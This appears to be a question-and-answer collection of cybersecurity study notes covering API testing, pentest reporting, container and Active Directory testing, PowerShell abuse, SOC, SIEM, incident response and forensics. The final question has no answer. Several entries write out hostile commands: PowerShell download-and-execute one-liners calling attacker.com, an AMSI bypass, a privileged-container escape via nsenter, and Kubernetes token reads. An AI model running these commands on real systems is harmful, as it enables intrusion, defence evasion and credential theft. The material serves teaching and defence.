How do you test APIs for security vulnerabilities using Postman?

Postman for API security testing: Postman: API collaboration and testing platform; useful for security testing when Burp Suite not available or for scripting automated security checks. Setup: import API collection (OpenAPI/Swagger spec: File > Import; or record traffic via Postman Proxy); organise requests by functionality. Authentication: configure authentication at collection level; bearer tokens, API keys, OAuth2 flow; environment variables for tokens (avoid hardcoding). Manual security testing: IDOR: parameterise resource IDs; use Postman variables; manually change user_id to other user ID; check response. Authentication bypass: remove Authorization header; change to different user token; expired token; malformed token. Input validation: add special characters to all string fields: apostrophes, angle brackets, semicolons, template expressions; check response for errors, reflections, injection. Mass assignment: add extra fields to POST/PUT body: role, admin, verified, balance; check if server accepts and applies them. Rate limiting: use Postman Runner to send 100 identical requests rapidly; observe if rate limiting triggered. Scripting: Postman Tests tab (JavaScript): pm.test with pm.response.to.have.status(200); security-specific tests for stack trace absence and sensitive data absence in error responses. Collection Runner: run all requests in collection automatically; check all pass security tests. Newman: CLI runner for Postman collections; newman run collection.json --environment env.json; integrate into CI/CD; run security tests on every deployment. Limitations vs Burp: Postman not designed for fuzzing (Burp Intruder better); Postman cannot intercept/modify browser requests (need Burp for web app testing); Postman better for API-first testing with known endpoints.
What are the key elements of a penetration test report executive summary?

Executive summary: 1-2 page section for C-suite and board; non-technical; conveys risk and business impact without technical jargon. Key elements: (1) Engagement overview: who engaged who; when testing occurred; what was tested (external perimeter, internal network, web applications); testing type (black/grey box). (2) Overall risk rating: single colour-coded risk level (Critical/High/Medium/Low) for entire assessment; methodology for determining (based on highest-severity finding? Weighted average?). (3) Summary of findings: number of vulnerabilities by severity (3 Critical, 7 High, 15 Medium, 8 Low, 4 Informational); avoid technical names at this level; use business language. (4) Key findings narrative: 2-3 most critical findings in business language: An unauthenticated attacker with network access could compromise all user accounts and access confidential customer data rather than SMB relay attack exploiting lack of signing allows NTLM credential forwarding. (5) Risk context: how do findings compare to industry? What is likelihood of exploitation? What is business impact (data breach, operational disruption, regulatory penalty, reputational damage)? (6) Attack narrative: brief story of how a real attacker would progress (obtained foothold via phishing email, moved laterally through network, reached financial systems within 4 hours). (7) Remediation priorities: top 3-5 actions with highest risk reduction; business-language recommendations; timeline urgency. (8) Positive findings: what security controls worked well? Demonstrates balanced assessment not just negative findings; builds trust. Common mistakes: too technical (include CVE numbers in exec summary); too long (no one reads 10-page exec summary); no business impact (CVE score without explaining what attacker could do with it); blame language (avoid implying negligence); missing remediation priorities (executive needs to know what to prioritise budget for).
How do you perform container security testing?

Container security testing methodology: Image security: pull target image; scan with Trivy: trivy image TARGET_IMAGE (report CVEs in base image and packages); inspect Dockerfile if available for security anti-patterns. Dockerfile analysis: USER root (should use non-root user); ADD http:// (fetches from HTTP not HTTPS); COPY secrets.env. (credentials in image layers); no HEALTHCHECK; no specific tag (using :latest = unpredictable); RUN apt-get without --no-install-recommends (bloated attack surface). Layer inspection: dive (container layer explorer) -- inspect each layer for accidentally included secrets or credentials; docker history IMAGE --no-trunc (view commands per layer). Running container testing: docker exec -it CONTAINER_ID bash (interactive shell in container); check running processes, network connections, file permissions; whoami (should not be root -- check for privilege escalation). Network: docker network inspect NETWORK (container IP assignments, exposed ports); nmap against container IPs from same network; check if containers unnecessarily can reach internet (no egress filtering). Secrets in running container: printenv (environment variables -- credentials?); cat /proc/1/environ (process 0 environment); check mounted files: ls /run/secrets/, ls /vault/secrets. Docker API exposure: curl http://localhost:2375/containers/json (if Docker API exposed without auth = full container control); scan for exposed port 2375/2376. Kubernetes specific: kubectl auth can-i --list (what permissions does current service account have); check service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token; decode JWT (permissions visible in payload); test API server with token: curl -k https://kubernetes.default/api/v1/pods --header Authorization: Bearer $TOKEN. Container escape: check for privileged flag: cat /proc/self/status | grep CapEff (all caps = privileged); fdisk -l (visible disks = privileged container, can mount host filesystem). nsenter in privileged: nsenter --target 1 --mount --uts --ipc --net --pid -- chroot /host /bin/bash = full host escape from privileged container.
What security testing should be done on APIs before release?

API pre-release security testing checklist: Authentication: all endpoints require authentication (test without token); tokens expire after reasonable time; refresh tokens revoked on logout; JWT signature validated (all algorithms); token transmitted securely (HTTPS only, not in query string). Authorization: test all endpoints with different user roles; low-privilege user cannot access high-privilege endpoints; resource-level auth (user can only access own resources -- IDOR testing); admin endpoints require admin role (not just any authenticated user). Input validation: fuzz all parameters (SQLi, command injection, SSTI, XSS payloads); integer overflow (send max int values); negative numbers for quantities; null values; empty strings; very long strings (buffer overflow potential); special characters; JSON injection in nested objects; XML payloads if XML accepted. Business logic: sequence attacks (skip steps in multi-step process); price manipulation (change price in request body); quantity manipulation (negative quantity = refund?); race conditions (submit payment twice simultaneously); state manipulation (revert cancelled order?). Rate limiting: brute force login endpoint (100 requests, no lockout?); API key enumeration (rapid requests from different IPs); password reset code brute force. Error handling: trigger errors; check if stack traces exposed; database error messages visible; internal path disclosure in errors. Data exposure: response contains only necessary fields (not entire database row); PII properly masked or excluded; sensitive data in response headers (debug headers). Security headers: HTTPS enforced; HSTS header; CSP if API returns HTML; no Cache-Control: no-store for sensitive endpoints; no debug headers in production. API versioning: older version tested with same security controls; deprecated endpoints removed or protected. Dependency scanning: SCA on API codebase dependencies before release. Documentation: does API documentation expose sensitive endpoint or parameter details that should be internal?
What is Insecure Direct Object Reference (IDOR) at the API level?

API-level IDOR: object identifiers in API requests reference data the authenticated user should not access. Common patterns: numeric sequential IDs: GET /api/orders/12345 -- attacker changes to /api/orders/12346 (another user's order); UUID IDs: not guessable but may be leaked via search, linked documents, error messages; encode: base64 or hash IDs not truly protecting -- decode and enumerate. Test methodology: create two test accounts (User A and User B); log all requests as User A accessing User A resources; collect all resource identifiers (order IDs, document IDs, account IDs, message IDs); replay each request authenticated as User B with User A's IDs; check for data returned that belongs to User A. HTTP methods: GET IDOR (read other user data); PUT/PATCH IDOR (modify other user data); DELETE IDOR (delete other user data); POST IDOR (perform action on other user's behalf). Object types: user profile (/api/users/123); orders (/api/orders/456); messages (/api/messages/789); files (/api/files/document.pdf); invoices (/api/invoices/INV-001). Indirect IDOR: IDOR via POST body parameter (not URL): {user_id: 123, action: delete_account}; change user_id to other account; account deleted. API aggregation: /api/reports?user_ids=123,456,789 -- user can aggregate data for multiple user IDs; can include IDs belonging to other users. Chained IDOR: first request reveals another user's order ID via indirect disclosure; second request uses that ID for direct IDOR. Privilege IDOR: change account_type or role parameter for own account; vertical privilege escalation via IDOR on own user object. IDOR in response: GET /api/profile returns current user profile; what if POST /api/profile updates profile and returns updated data -- does update affect only own profile? Detection: Autorize (Burp extension): replays every request with another user's token; highlights responses that differ (indicating possible IDOR success).
How do attackers use living-off-the-land techniques in PowerShell?

PowerShell LOLbas techniques: PowerShell is built-in and often trusted; powerful scripting with.NET access; commonly abused by attackers. Execution bypasses: powershell -ExecutionPolicy Bypass -File script.ps1 (bypass execution policy -- does not require admin); powershell -ExecutionPolicy Unrestricted -Command... (inline command without file); powershell -NonInteractive -WindowStyle Hidden -Command... (hide window); powershell -EncodedCommand BASE64 (encode command to avoid command-line monitoring). Download and execute (common initial access chain): IEX(New-Object Net.WebClient).DownloadString(http://attacker.com/payload.ps1) -- download and execute in memory; or: IEX((Invoke-WebRequest http://attacker.com/p.ps1).Content); or: (Invoke-RestMethod http://attacker.com/p.ps1) | IEX; all download PowerShell code to memory without touching disk. Credential access: Invoke-Mimikatz (PowerSploit module): runs Mimikatz in-memory via reflection; Get-NetUser / Get-ADUser: enumerate AD users; Get-WmiObject Win32_UserAccount (local users). Recon: Get-ADComputer -Filter * (all AD computers); Test-NetConnection -ComputerName DC01 -Port 445 (port check without nmap); Get-NetTCPConnection (active connections, replacement for netstat). Post-exploitation tools: PowerView (AD enumeration: Get-DomainUser, Get-DomainGroup, Find-LocalAdminAccess); Invoke-Kerberoast (PowerSploit Kerberoasting); PowerShell Empire (older framework). AMSI bypass: [Ref].Assembly.GetType(System.Management.Automation.AmsiUtils).GetField(amsiInitFailed,NonPublic,Static).SetValue($null,$true) (set AMSI initialisation failed flag -- disables AMSI for current session); various obfuscation-based bypasses. Script Block Logging bypass: obfuscate code so AMSI/SBL does not recognise patterns; split strings: IE(&X); base64 decode at runtime; Invoke-Obfuscation tool. Detection: PowerShell Script Block Logging (Event 4104): logs all PowerShell code executed (even if obfuscated, final deobfuscated block logged in some cases); PowerShell Module Logging (Event 4103); Constrained Language Mode (CLM) restricts PowerShell capabilities; anti-malware scan interface (AMSI) -- script content scanned before execution; Defender ATP/Sentinel detects common PS malware patterns.
What is an assumption of breach and why is it important?

Assume Breach mindset: security strategy assuming attackers have already or inevitably will gain initial access to your environment; shifts focus from perimeter defence to detection, containment, and response. Why important: perimeter-only security (trust inside, block outside) fails against: phishing (user on trusted network downloads malware); insider threats; supply chain attacks (trusted software delivers malware); compromised third-party with access; VPN credential theft. If only protecting perimeter: once attacker is inside, they have free rein; lateral movement undetected; weeks to months dwell time before detection. Assume Breach principles: Zero Trust Architecture: every access request verified regardless of network location; no implicit trust based on being inside corporate network; MFA, continuous verification, least privilege everywhere. Detection over prevention-only: invest in detection capabilities (SIEM, EDR, NDR, honeypots); attackers will get in; how quickly do you detect them? Dwell time metric (time from compromise to detection): industry average 21 days (CrowdStrike 2024); reduce to hours or days. Segmentation: if attacker has one compromised host, limit what they can reach; network segmentation; identity segmentation (no lateral movement with same credentials); crown jewel isolation. Incident response readiness: practise with tabletop exercises and red team exercises; clear playbooks; RACI for incidents; external IR retainer (Mandiant, CrowdStrike Services, IBM X-Force). Assume Breach testing: purple team with Assume Breach scenario: attacker starts with compromised workstation; measure Blue Team detection; lateral movement testing. Business value: assume breach -> find gaps in detection and response -> fix gaps before real attacker finds them; more realistic than assuming perimeter is sufficient; board-level security posture discussion around Assume Breach resonates with executives who have seen news of major breaches despite good perimeter defences.
How do you document findings in a penetration test using CVSS?

CVSS (Common Vulnerability Scoring System): standardised framework for rating vulnerability severity. CVSS 3.1 base score components: Attack Vector (AV): Network (N) -- remotely exploitable; Adjacent (A) -- same network segment; Local (L) -- local access needed; Physical (P) -- physical access. Attack Complexity (AC): Low (L) -- reproducible every time; High (H) -- specific conditions required. Privileges Required (PR): None (N); Low (L) -- regular user; High (H) -- admin. User Interaction (UI): None (N); Required (R) -- victim must take action. Scope (S): Unchanged (U) -- same security scope; Changed (C) -- impacts other components. Confidentiality, Integrity, Availability Impact: None (N); Low (L); High (H). Example: Apache Log4Shell CVE-2021-44228 CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 Critical; Network exploitable, low complexity, no privileges, no user interaction, scope changed, all three impacts high. Score ranges: Critical 9.0-10.0; High 7.0-8.9; Medium 4.0-6.9; Low 0.1-3.9; None 0. Temporal metrics: Exploitability (E): unproven, proof-of-concept, functional exploit, high; Remediation Level (RL): unavailable, workaround, temporary fix, official fix; Report Confidence (RC): unknown, reasonable, confirmed; reduce base score when no public exploit exists. Environmental metrics: account for organisation-specific context; if confidentiality impact doesn't matter (public data only) -- lower score for that organisation; if asset in DMZ with compensating controls -- lower effective score. In penetration test reporting: include CVSS vector string and score with each finding; explain which CVSS factors apply to this specific vulnerability and why; include temporal score if exploit is published; explain if environmental factors reduce risk for client; help client prioritise remediation by CVSS score + asset criticality + business impact.
What is the difference between a vulnerability scan and a penetration test?

Vulnerability scan vs penetration test: Vulnerability scan: automated tool (Nessus, Qualys, Rapid7, OpenVAS) runs against target; identifies known vulnerabilities by testing indicators (service banners, version numbers, configuration checks, authenticated patch level); generates list of potential vulnerabilities; does NOT exploit them; produces many findings including false positives; fast (hours); relatively cheap; repeatable; conducted frequently (weekly/monthly). Penetration test: human-led engagement simulating real attacker; manually validates vulnerabilities by exploiting them; chains vulnerabilities for higher impact; discovers business logic flaws and vulnerabilities scanners miss; produces validated, proven findings; few or no false positives (only confirmed exploitable issues); slow (days to weeks); expensive ($10,000-$100,000+); conducted infrequently (annually, quarterly); provides business impact context. When scan finds: Open port 445 with outdated SMB version -- potential MS17-010; pentest confirms: exploited MS17-010 to achieve domain admin on Server 2019 within 2 hours. When pentest finds what scan misses: business logic flaw (order price manipulation -- scan cannot understand business logic); chained vulnerabilities (low + medium + info = critical attack path -- scan rates each independently); authentication bypass via race condition; complex access control issues; social engineering vector. Which to use: both; scan for breadth and frequency (cheap, fast, finds known issues); pentest for depth and real-world attack simulation (finds complex issues, validates scan findings, provides attack narrative). Compliance: PCI DSS 11.3 requires vulnerability scanning (quarterly) AND penetration testing (annually); different requirements met by different activities. Bug bounty: combines elements of both -- human testers with continuous scope.
How do you enumerate Active Directory without admin privileges?

Active Directory enumeration from low-privilege domain user: any domain user can query most AD information by default. Built-in Windows commands: net user /domain (list all domain users); net group /domain (list all domain groups); net group Domain Admins /domain (members of Domain Admins); net group Enterprise Admins /domain; whoami /groups (current user's group memberships); systeminfo (OS version, patch level, domain); nltest /dclist:DOMAIN (list domain controllers). PowerShell: Get-ADUser -Filter * -Properties * (all users with all properties -- requires AD module or RSAT); Get-ADGroup -Filter * (all groups); Get-ADGroupMember Domain Admins (DA members); Get-ADComputer -Filter * (all computers); [adsisearcher]searcher=New-Object DirectoryServices.DirectorySearcher; searcher.SearchRoot=New-Object DirectoryServices.DirectoryEntry; searcher.Filter=(objectCategory=computer); searcher.FindAll() (ADSI search without AD module). PowerView (no admin needed for most functions): Get-NetDomain (domain info); Get-NetDomainController (domain controllers); Get-DomainUser (all users with properties); Get-DomainGroup (groups); Get-DomainGroupMember Domain Admins (DA members); Get-DomainComputer (all computers); Find-DomainShare (enumerate all accessible shares); Get-DomainGPO (Group Policy Objects); Get-DomainTrust (trust relationships between domains); Invoke-ACLScanner (ACL misconfigurations). BloodHound collection: SharpHound.exe --CollectionMethod All (runs as regular user; collects all above data plus session data and ACLs; uploads to BloodHound). LDAP queries: ldapsearch -H ldap://DC01 -x -b DC=corp,DC=com (anonymous if anonymous bind allowed); with creds: ldapsearch -H ldap://DC01 -D user@corp.com -w password -b DC=corp,DC=com (objectClass=user). Interesting attributes: servicePrincipalName (SPNs for Kerberoasting); logonCount=0 (service accounts that never logged in -- no password change); badPwdCount; adminCount=1 (protected objects). SMB enumeration: smbmap -H DC01 -u user -p pass (list shares and permissions); crackmapexec smb 10.0.0.0/24 -u user -p pass --shares (network-wide share enumeration).
What is the CIA triad in cybersecurity?

CIA triad: foundational model for information security policy comprising Confidentiality, Integrity, and Availability. Confidentiality: information accessible only to authorised parties; controls: encryption, access control lists, authentication, data classification; threats: data breach, eavesdropping, insider theft. Integrity: information accurate and unmodified by unauthorised parties; controls: hashing (SHA-256), digital signatures, checksums, audit trails, version control; threats: man-in-the-middle modification, SQL injection altering database records, malware corrupting files. Availability: information and systems accessible when needed by authorised users; controls: redundancy, failover, load balancing, DDoS protection, backup and recovery, patch management; threats: DDoS attacks, ransomware (encrypts making files unavailable), hardware failure, power outage. Extended models: PARKERIAN HEXAD adds Possession/Control (physical control of data medium), Authenticity (genuineness), Utility (usability of data in useful form); DAD (opposite of CIA): Disclosure, Alteration, Denial -- attack model. Balancing CIA: security controls often trade off between components; heavy encryption may reduce availability (performance overhead); very high availability requirements may require accepting lower security controls; risk management determines acceptable balance. Application to security design: DLP (Data Loss Prevention) protects confidentiality; WAF protects integrity; CDN and load balancers protect availability; security decisions mapped back to which CIA component they protect; incident categorisation by CIA impact; regulatory requirements mapped to CIA (HIPAA = confidentiality of health data; PCI DSS = integrity of payment data; SLA = availability).
What is defence in depth?

Defence in depth (DiD): layered security strategy where multiple independent security controls protect against threats; no single control is relied upon exclusively; attacker must defeat all layers. Origins: military strategy term; applied to cybersecurity by NSA and subsequently NIST. Layers: Perimeter: firewall, DMZ, IPS, web filtering, email security gateway, DDoS protection; Network: network segmentation, VLANs, internal firewalls, IDS/IPS on internal segments, network access control (NAC); Host: endpoint detection and response (EDR), antivirus, host-based firewall, patch management, application whitelisting; Application: input validation, secure coding, WAF, authentication, session management; Data: encryption at rest and in transit, DLP, access control lists, classification; Human: security awareness training, phishing simulations, background checks, least privilege culture. Example: attacker bypasses perimeter firewall (layer 1 defeated) but faces network segmentation (layer 2 -- cannot reach database server directly); achieves code execution on web server but EDR detects Mimikatz (layer 3); attempts to read database but data encrypted at rest (layer 6 -- ciphertext only). Why effective: diverse controls from different vendors resist single exploit; time to detect increases with each layer attacker must bypass; impractical to have zero-day for every control simultaneously; compliance frameworks (PCI DSS, NIST) often require multiple overlapping controls. Common mistake: many layers of the same type (five different antivirus products) vs diverse layers covering different attack vectors; quantity is not quality; ensure coverage across all layers rather than deep redundancy at one layer.
What is the principle of least privilege?

Principle of Least Privilege (PoLP): every user, program, and system component should have only the minimum permissions needed to perform its function; nothing more. Application: User accounts: standard user accounts for daily work; separate admin account for administrative tasks; admin account used only when necessary; no running email or web browser as administrator. Service accounts: Windows service runs as specific service account (not SYSTEM or Administrator); service account has permission only for its specific resources; SQL Server service account has read/write to its databases but not entire filesystem or other services. Applications: web application database user has SELECT, INSERT, UPDATE, DELETE on its own tables only; not CREATE TABLE, DROP TABLE, or access to other application databases; application server process runs as non-root user. Network: firewall rules allow only required ports and protocols between segments; API gateway only allows required methods and paths. Benefits: limits blast radius: if account compromised, attacker has only that account permissions; reduces attack surface: fewer privileges = fewer targets for privilege escalation; simplifies security auditing; supports compliance (SOX, PCI DSS require PoLP). Implementation challenges: users and developers often request broad permissions for convenience; admin by default is common; developer laptops often run as local admin (required for some software but creates risk); over-provisioning from initial access that never gets reduced. Implementation: PAM solutions (CyberArk, BeyondTrust) for just-in-time privilege (elevate when needed, remove after); regular access reviews (certify who needs what access quarterly); role-based access control with well-defined minimal roles; PIM (Privileged Identity Management) in Azure AD; AWS IAM policies scoped to specific resources and actions.
What is zero trust architecture?

Zero Trust Architecture (ZTA): security model based on principle never trust, always verify; assumes breach; verifies every access request as if from an untrusted network regardless of source. Core tenets (NIST SP 800-207): all resources treated as if on internet (no implicit trust from network location); access granted on per-session basis with least privilege; access to resources determined by dynamic policy including user identity, device health, request context; all traffic monitored and logged. Why Zero Trust: traditional perimeter (trust inside, block outside) fails; employees remote (VPN doesn't guarantee device is clean); cloud resources not inside perimeter; lateral movement after perimeter breach trivial; SolarWinds-type attacks show trusted internal systems compromised. Components: Identity: strong authentication (MFA, passwordless, conditional access) for every access request; continuous identity verification not just at login. Device: device health checked before access (patch level, EDR running, disk encryption, compliance); MDM/UEM (Microsoft Intune, Jamf) enforces device posture. Network: micro-segmentation replaces flat network; software-defined perimeter; ZTNA (Zero Trust Network Access) replaces VPN for application access. Application: application-layer access control; internal apps not visible until authenticated; CASB (Cloud Access Security Broker) for cloud apps. Data: data classification; encryption; DLP; access controls follow data not network location. Key vendors: Palo Alto Prisma Access, Zscaler ZPA, Microsoft Azure AD Conditional Access + Defender for Endpoint, Google BeyondCorp Enterprise, Cisco Duo + Umbrella. Migration: NIST recommends iterative approach; start with identity and device health checks; add micro-segmentation; expand to full ZTA over time; not a product but an architecture; requires cultural and process changes alongside technology.
What is a security operations centre (SOC)?

Security Operations Centre (SOC): centralised facility where information security personnel continuously monitor and analyse security events; detect, investigate, and respond to cybersecurity incidents. Functions: continuous monitoring (24/7/365 typically); alert triage and investigation; incident response; threat hunting; vulnerability management coordination; compliance reporting. Tiers: Tier 1 (Alert Analyst): monitor SIEM dashboard; triage incoming alerts; identify false positives; escalate true positives; handle high-volume routine alerts; entry-level role. Tier 2 (Incident Responder): investigate escalated incidents; deeper analysis; containment and remediation; malware analysis; forensics. Tier 3 (Threat Hunter): proactive threat hunting; advanced analysis; develop detection rules; threat intelligence application; most senior analysis role. SOC Manager: oversee operations; reporting to CISO; team management; KPI tracking. Key metrics: MTTD (Mean Time to Detect): average time from incident start to detection; MTTR (Mean Time to Respond): average time from detection to containment; alert volume; false positive rate; escalation rate; SLA adherence (response time). Core technology: SIEM (Security Information and Event Management): log aggregation and correlation; Splunk, Microsoft Sentinel, IBM QRadar, Elastic Security; SOAR (Security Orchestration, Automation and Response): automated playbooks; reduce Tier 1 manual work; TheHive, Splunk SOAR, Palo Alto XSOAR; EDR (Endpoint Detection and Response): CrowdStrike Falcon, SentinelOne, Microsoft Defender; Threat intelligence platform (TIP): VirusTotal, Recorded Future, MISP; UEBA (User and Entity Behaviour Analytics): detect anomalous behaviour. Challenges: alert fatigue (too many false positives); analyst burnout; talent shortage; keeping up with threat landscape; tuning detection rules to reduce noise.
What is SIEM and how does it work?

SIEM (Security Information and Event Management): platform that collects, correlates, and analyses security logs from across IT infrastructure; provides real-time threat detection and compliance reporting. How it works: Log collection: agents or agentless log forwarding from: servers (Windows Event Logs, Linux syslog), network devices (firewall, router, switch logs), applications (web server, database, authentication), security tools (EDR, AV, IDS), cloud services (AWS CloudTrail, Azure Monitor, Office 365 audit logs). Normalisation: logs from different sources in different formats; SIEM normalises to common schema (Common Event Format, Syslog standard fields); enables correlation across diverse sources. Correlation: rules match patterns across multiple log sources and events; example rule: source IP failed login 10 times in 5 minutes on multiple systems = brute force attack alert; or: PowerShell executed, then base64 decoded string, then network connection to external IP = likely malware. Alerting: matched rules generate alerts; sent to SOC analyst queue; severity assigned based on rule confidence and asset criticality. Search and investigation: analyst searches logs across all sources; timeline reconstruction; pivot from IP to user to machine; query: all events from source IP in last 24 hours. Use cases: failed login tracking; privilege escalation detection; data exfiltration detection (large outbound transfers); malware detection (process creation, network connections); compliance reporting (PCI DSS 10.x logging requirements). Popular SIEMs: Splunk (market leader; powerful search; expensive; SPL query language); Microsoft Sentinel (cloud-native; Azure integration; KQL language; pay-per-GB; elastic scaling); IBM QRadar; Elastic Security (open source); LogRhythm; Exabeam (UEBA-focused). MITRE ATT&CK mapping: modern SIEMs map detections to ATT&CK framework techniques; helps coverage analysis and prioritisation.
What is threat hunting and how is it performed?

Threat hunting: proactive security activity where analysts search for threats that have evaded existing security controls; hypothesis-driven investigation without waiting for alerts. Why: modern sophisticated attackers (APTs) often evade automated detection; dwell time (time between compromise and detection) averages 21 days (CrowdStrike 2024 report); reactive alerting catches known patterns but not novel TTPs; threat hunting finds attackers already inside. Hypothesis generation: based on: threat intelligence (reports about specific threat actor targeting your industry; CISA advisories); ATT&CK matrix (hunt for specific techniques used by relevant threat actors); past incidents (did attacker use similar technique before?); anomaly baseline (investigate statistical outliers). Hunting process: define hypothesis: Hypothesis -- Cobalt Strike beacons may be present -- look for HTTP traffic at consistent intervals (beaconing pattern); gather data: SIEM query for HTTP connections with consistent timing intervals; endpoint logs for suspicious process spawning; analyse: review results; eliminate false positives (legitimate software with similar beaconing pattern); identify suspicious candidates; investigate: deep dive into suspicious hosts; memory analysis; file analysis; document: record hypothesis, method, data queried, findings; update detection rules if gap found. Common hunts: persistence mechanisms: HKCU Run keys, scheduled tasks, WMI subscriptions; lateral movement: unusual RDP, WMI, PsExec connections between internal hosts; credential dumping: LSASS access by unusual processes; C2 communication: unusual outbound connections, DNS tunneling, beaconing patterns; privilege escalation: unusual SYSTEM-level processes. Tools: EDR (CrowdStrike Threat Graph query, SentinelOne Deep Visibility, Defender Advanced Hunting KQL); SIEM (Splunk SPL, Sentinel KQL); Velociraptor (open source hunting framework); YARA (file pattern matching); Sigma (generic SIEM rule format -- share hunts across SIEMs).
What is incident response and what are its phases?

Incident Response (IR): structured approach to handling cybersecurity incidents; goal to contain damage, minimise recovery time, and prevent recurrence. NIST SP 800-61 phases: (1) Preparation: develop IR plan, playbooks, and policies; assemble IR team with defined roles; deploy tools (EDR, SIEM, forensics); establish communication channels; tabletop exercises; IR retainer with external firm; legal counsel engaged in advance. (2) Detection and Analysis: receive alert or report; determine if security incident or false positive; scope: how many systems affected? What data potentially accessed? Timeline reconstruction; severity classification (P1-P4 based on impact); notify stakeholders per plan. (3) Containment: prevent further damage; short-term: isolate compromised systems (network isolation, EDR isolation); change compromised credentials; block attacker-controlled IPs/domains; long-term containment (systems still needed -- monitor with additional controls while preparing for eradication). (4) Eradication: remove malware, webshells, persistence mechanisms; remove attacker-created accounts; close exploited vulnerability; verify clean using forensics or reimaging. (5) Recovery: restore systems from clean backup or rebuild; restore data from backup; monitor closely for reinfection; return to production when confidence in clean state; document recovery steps. (6) Post-Incident Activity (Lessons Learned): conduct post-mortem 2 weeks after resolution; root cause analysis; what worked well? What failed? Update IR plan, detection rules, security controls based on lessons; regulatory reporting if required (GDPR 72-hour notification, US state breach laws, SEC incident disclosure). Key concepts: chain of custody for forensic evidence; legal hold for relevant data; communication plan (internal to leadership, external to customers/regulators if required); media handling (PR team involvement for significant incidents).
What is digital forensics and where is it used?

Digital forensics: application of scientific methods to collect, preserve, analyse, and present digital evidence in defensible manner. Branches: Computer forensics: hard drives, memory, operating system artefacts; Mobile forensics: smartphones, tablets, app data, call records, GPS; Network forensics: packet captures, netflow data, log analysis; Cloud forensics: logs from cloud providers, virtual machine images; Malware forensics: reverse engineering malicious software; Database forensics: database transaction logs, deleted records. Forensic process: (1) Identification: determine what systems are involved; document scope. (2) Preservation: prevent alteration of evidence; legal hold; create forensic copy (bit-for-bit image using dd, FTK Imager, or Guymager) before analysis; write blockers (hardware device prevents any writes to original evidence drive); hash verification (MD5 or SHA-256 of original and copy must match -- proves no alteration). (3) Analysis: examine artefacts without modifying original; mounted image analysis or file export; tools: Autopsy (open source), FTK (Forensic Toolkit), Magnet AXIOM, Cellebrite (mobile). Key artefacts: Windows Registry (user activity, installed programs, USB devices, recent files); Prefetch files (evidence of program execution even if deleted); Event Logs (login history, security events); Browser history (visited URLs, downloads, searches); Recycle Bin (deleted files with original path and deletion time); Shadow Copies (VSS -- previous file versions); Memory artefacts (running processes, network connections, encryption keys from RAM). (4) Documentation: chain of custody documentation; detailed notes of all actions taken; timestamps; hash values. (5) Reporting: findings presented clearly; suitable for legal proceedings; expert witness testimony if court case. Use cases: criminal investigation (law enforcement); civil litigation; corporate HR investigation; incident response; intellectual property theft.
What is threat intelligence and how is it operationalised?

Threat intelligence (TI): knowledge about threats that helps organisations make informed security decisions. Types: Strategic: high-level; intended for executives; threat landscape trends, threat actor motivations, geopolitical context; non-technical; informs budget and security strategy decisions. Operational: information about specific planned attacks; threat actor TTPs (Tactics, Techniques, Procedures); attack campaigns targeting industry; informs SOC and security team priorities. Tactical: indicators of compromise (IoCs); IP addresses, domains, file hashes, email subjects associated with specific threats; directly usable in security controls (block list, SIEM rules). Technical: malware samples, exploit code, vulnerability details; used by threat researchers and malware analysts. Sources: Open source (OSINT): VirusTotal, AlienVault OTX (Open Threat Exchange), MISP (community sharing), government (CISA, FBI Flash Alerts, UK NCSC advisories), Twitter (security researchers), Shodan. Commercial: Recorded Future, Mandiant Advantage, CrowdStrike Intelligence, Flashpoint (dark web focus). Information Sharing: ISACs (Information Sharing and Analysis Centers) -- sector-specific (FS-ISAC for financial, H-ISAC for healthcare, E-ISAC for electricity); STIX/TAXII (Structured Threat Information Expression/Trusted Automated Exchange of Indicator Information) -- standard format for sharing TI. Operationalisation: IoC feeds to SIEM (auto-create alerts when IoC observed in logs); IoC feeds to EDR (block known malicious hashes, domains); firewall block lists (malicious IPs); Vulnerability intelligence: prioritise patching CVEs being actively exploited (CISA KEV catalog); Threat actor profiling: if nation-state actor known to target your industry, hunt for their specific TTPs; Purple team exercises based on threat actor TTPs. Threat intelligence lifecycle: planning, collection, processing, analysis, dissemination, feedback.
How does a hardware security module (HSM) work?

HSM (Hardware Security Module): dedicated hardware device for secure cryptographic key management and cryptographic operations; keys stored in tamper-resistant hardware; private keys never leave HSM in plaintext. Physical security: tamper-evident and tamper-resistant enclosure; HSM detects physical tampering and zeroes all keys; FIPS 140-2 Level 3 or Level 4 certification (highest level); operates within FIPS validated boundary; HSM firmware digitally signed by manufacturer; no backdoor access. Key management: master keys (KEK -- Key Encryption Keys) generated and stored inside HSM; application keys wrapped (encrypted) by HSM and stored in database; when application needs to use key: sends wrapped key to HSM; HSM unwraps and performs operation internally; private key never exported in plaintext. Operations: RSA/ECDSA signing (code signing, certificate signing, TLS private key operations); AES encryption/decryption; key generation (true random number generator hardware -- higher quality than software RNG); certificate authority operations (CA private key secured in HSM). Use cases: Certificate Authority: CA private key must never be exposed; HSM mandatory for publicly trusted CAs (CA/Browser Forum Baseline Requirements); TLS termination: private keys for HTTPS certificates secured in HSM (network HSMs from nCipher, Thales); Payment systems: PCI DSS requires PIN encryption using HSMs; ATM PIN encryption; payment card production; code signing: OS and software updates signed with keys in HSM (prevents supply chain attacks on update mechanism). Cloud HSMs: AWS CloudHSM (dedicated hardware in AWS); Azure Dedicated HSM; GCP Cloud HSM (managed, not dedicated); AWS KMS (managed key service backed by HSMs but shared -- not dedicated hardware per customer). Performance: HSMs perform thousands of RSA operations per second; hardware acceleration; dedicated offloads crypto from application servers.
What are common techniques for lateral movement in Windows environments?

